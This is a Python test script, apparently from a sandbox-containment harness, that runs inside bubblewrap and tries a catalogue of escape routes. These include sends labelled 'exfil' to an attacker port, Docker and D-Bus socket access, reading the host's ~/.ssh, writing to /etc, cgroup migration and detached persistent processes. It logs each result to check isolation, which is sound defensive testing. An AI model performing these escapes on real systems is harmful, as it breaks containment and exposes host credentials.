#!/usr/bin/env python3
"""Hostile fire for the namespace spike. Runs inside bwrap.

Tries every route out it knows once, logging what happened from its own point
of view to /beats/attempts.log. The harness judges network routes by what the
host actually received. Then it detaches heartbeats and uses the chimney in a
loop, logging to /beats/net.log.
"""

import os
import socket
import subprocess
import time
from collections.abc import Callable
from pathlib import Path

BEATS = Path("/beats")
BEAT_SH = os.environ["BEAT_SH"]
CHIMNEY = "/run/firepit/chimney.sock"
AGENT = "/run/firepit/agent.sock"
DEST = os.environ["DEST"]


def log(path: str, line: str) -> None:
    with (BEATS / path).open("a") as f:
        f.write(line + "\n")


def attempt(name: str, action: Callable[[], object]) -> None:
    try:
        action()
        log("attempts.log", f"{name} ok")
    except Exception as err:  # every failure is a result worth recording
        log("attempts.log", f"{name} denied ({type(err).__name__}: {err})")


def tcp_send(host: str, port: int, line: str) -> None:
    with socket.create_connection((host, port), timeout=1) as s:
        s.sendall(line.encode())


def unix_send(address: str, line: str) -> None:
    with socket.socket(socket.AF_UNIX) as s:
        s.settimeout(1)
        s.connect(address)
        s.sendall(line.encode())


def udp_send(host: str, port: int, line: str) -> None:
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.sendto(line.encode(), (host, port))


def write_file(path: str) -> None:
    Path(path).write_text("fire was here\n")


def routes_out() -> None:
    aport = int(os.environ["ATTACKER_PORT"])
    dhost, dport = DEST.rsplit(":", 1)
    attempt("tcp-attacker-loopback", lambda: tcp_send("127.0.0.2", aport, "exfil loopback\n"))
    if os.environ.get("HOST_IP"):
        attempt("tcp-attacker-host-ip", lambda: tcp_send(os.environ["HOST_IP"], aport, "exfil host-ip\n"))
    attempt("tcp-dest-direct", lambda: tcp_send(dhost, int(dport), "direct\n"))
    attempt("tcp-public-internet", lambda: tcp_send("1.1.1.1", 443, ""))
    attempt("udp-dest", lambda: udp_send(dhost, int(dport), "udp\n"))
    attempt("dns-lookup", lambda: socket.getaddrinfo("example.com", 443))
    attempt("abstract-socket", lambda: unix_send("\0" + os.environ["ABSTRACT_NAME"], "abstract\n"))
    attempt("declared-agent-socket", lambda: unix_send(AGENT, "agent\n"))
    attempt("undeclared-socket", lambda: unix_send(os.environ["UNDECLARED_SOCKET"], "undeclared\n"))
    attempt("user-bus", lambda: unix_send(f"/run/user/{os.environ['HOST_UID']}/bus", ""))
    attempt("docker-sock", lambda: unix_send("/run/docker.sock", ""))
    attempt("read-ssh-dir", lambda: os.listdir(os.path.join(os.environ["HOST_HOME"], ".ssh")))
    attempt("read-smoke", lambda: Path(os.environ["HOST_SMOKE"]).read_text())
    attempt("write-outside", lambda: write_file("/etc/firepit-was-here"))
    attempt("write-scratch", lambda: write_file("/scratch/note"))
    attempt("cgroup-migrate", lambda: write_file(os.environ["HOST_CGROUP_PROCS"]))
    attempt("nested-userns", lambda: os.unshare(os.CLONE_NEWUSER))
    attempt("signal-host-process", lambda: os.kill(int(os.environ["HOST_PID"]), 0))
    attempt("systemd-run", lambda: subprocess.run(["systemd-run", "--user", "true"], check=True, capture_output=True))


def detach_heartbeats() -> None:
    subprocess.Popen(["bash", BEAT_SH, str(BEATS), "child"])
    subprocess.Popen(["nohup", "bash", BEAT_SH, str(BEATS), "nohup"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.Popen(["setsid", "bash", BEAT_SH, str(BEATS), "daemon"], start_new_session=True)


def chimney_loop() -> None:
    n = 0
    while True:
        n += 1
        result = "fail"
        try:
            with socket.socket(socket.AF_UNIX) as s:
                s.settimeout(1)
                s.connect(CHIMNEY)
                s.sendall(f"{DEST}\nping {n}\n".encode())
                if s.makefile().readline().strip() == f"ping {n}":
                    result = "ok"
        except OSError:
            pass
        log("net.log", f"{time.time():.6f} chimney {result} {n}")
        (BEATS / "main.beat").touch()
        time.sleep(0.2)


if __name__ == "__main__":
    routes_out()
    detach_heartbeats()
    chimney_loop()
